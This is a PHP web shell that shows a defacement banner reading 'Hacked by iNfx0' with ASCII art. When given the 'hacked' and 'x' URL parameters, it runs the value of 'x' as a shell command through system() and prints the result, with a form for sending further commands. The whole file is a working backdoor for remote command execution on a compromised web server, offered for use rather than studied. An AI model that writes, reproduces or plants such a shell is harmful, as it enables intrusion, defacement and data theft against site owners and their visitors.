
<?php
echo '<title>Rekt</title>';


if(isset($_GET['hacked'])) {
    echo '<body style="background-color: #000000; "><pre>';
    echo '<head><style>
        input[type=button], input[type=submit], input[type=reset] {
          background-color: #242424;
          border: none;
          color: #66FF00;
          padding: 8px 16px;
          text-decoration: none;
          margin: 4px 2px;
          cursor: pointer;
        }
        input[type=text] {
            background-color: #242424;
            color: #66FF00;
          }
        </head></style>';
    echo '<center><div style="backround-color:#424242;color:#66FF00;">';
    echo "<div style=:float:left;font-size: 10pt;
    font-family: Arial;
    white-space: pre;
    display: block;>



_|  _|      _|      _|_|              _|_|    
    _|_|    _|    _|      _|    _|  _|    _|  
_|  _|  _|  _|  _|_|_|_|    _|_|    _|    _|  
_|  _|    _|_|    _|      _|    _|  _|    _|  
_|  _|      _|    _|      _|    _|    _|_|    



</div><br><br><br>";
    if(isset($_GET['x'])) {
        echo '<div style="background-color: #242424; height: 250px; max-width: 25%; overflow-y:auto;">
        <center>Output:</center>
        <br>';
        $test = $_GET['x'];
        $last_line = system($test, $retval);
        echo '<br></div>';
        echo '</center>';
        echo '</pre>
        <center>
        <br><br>
        <form action="/shell.php" method="get">
        <input type="hidden" id="hacked" name="hacked">
        <input type="text" id="x" name="x"><br><br>
        <input type="submit" value="Submit">
        </form>
        </div>
        </center>'; 
    } else {
        $test = '';
    }
} else {
    $test = '';
    echo '<body style="background-color: #000000; color: #66FF00;"><center>.:.<br>
    .:.:.:.:.:.:.:.........:..:.:.:.:.:.<br>
    .:..:..:. Hacked by iNfx0 .:..:..:.<br>
    .:.:.:.:.:.:.:.........:..:.:.:.:.:.<br>
    :............:............:<br>
    .....\_\_\_\_|_/_/_/_/.....<br>
    <br>
    .:.:.:.:.:.:.:.:.:.<br>
    .:.:.:.:.:.:.:.:.:.:.:.<br>
    .:.:.:.:.:.:.:.:.:.:.:.:.:.<br>
    .:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.<br>
    .:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.<br>
    .:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.<br>
    .:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.<br>
    .:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.<br>
    .:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.<br>
    .:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.<br>
    .:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.<br>
    .:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.<br>
    .:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.<br>
    .:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.<br>
    .:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.<br>
    .:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.<br>
    .:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.<br>
    .:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.:.<br>
    </div>';
    echo "<pre><div style=:float:left;font-size: 10pt;
font-family: Arial;
white-space: pre;
display: block;>
    _|  _|      _|      _|_|              _|_|    
        _|_|    _|    _|      _|    _|  _|    _|  
    _|  _|  _|  _|  _|_|_|_|    _|_|    _|    _|  
    _|  _|    _|_|    _|      _|    _|  _|    _|  
_|  _|      _|    _|      _|    _|    _|_|


        ⠀⠀⠀⠀⢀⣀⣠⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⡴⠞⠛⠉⠉⠉⠀⠈⠉⠉⠙⠛⠷⢦⣀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⢀⣴⠟⢁⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣄⡉⠳⣄⠀⠀⠀⠀⠀
⠀⠀⠀⣠⠟⢁⣴⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣦⠈⢳⡄⠀⠀⠀
⠀⠀⣰⠏⢠⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣷⡀⢻⡄⠀⠀
⠀⢰⡟⠀⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣷⠈⣿⡀⠀
⠀⣾⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⠟⣀⣤⣄⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⡄⢸⡇⠀
⠀⣿⠀⠘⠛⠛⠛⠛⠛⠛⠛⠃⢸⣿⣿⣿⣷⠀⠛⠛⠛⠛⠛⠛⠛⠛⠃⢸⡇⠀
⠀⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡇⠀
⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣶⣶⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠁⠀
⠀⠀⠹⣇⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀
 ⠀⠀⠘⢧⡀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⣠⡾⠁⠀⠀⠀
   ⠀⠈⠻⢦⣀⠀⠸⢿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀
⠀    ⠀⠀⠉⠛⠶⣦⣤⣀⣉⣉⣉⣁⣠⣤⣴⠶⠛⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀    ⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

</div><br><br><br></pre></center>";
echo '</body>';
}


// Printing additional info

?>
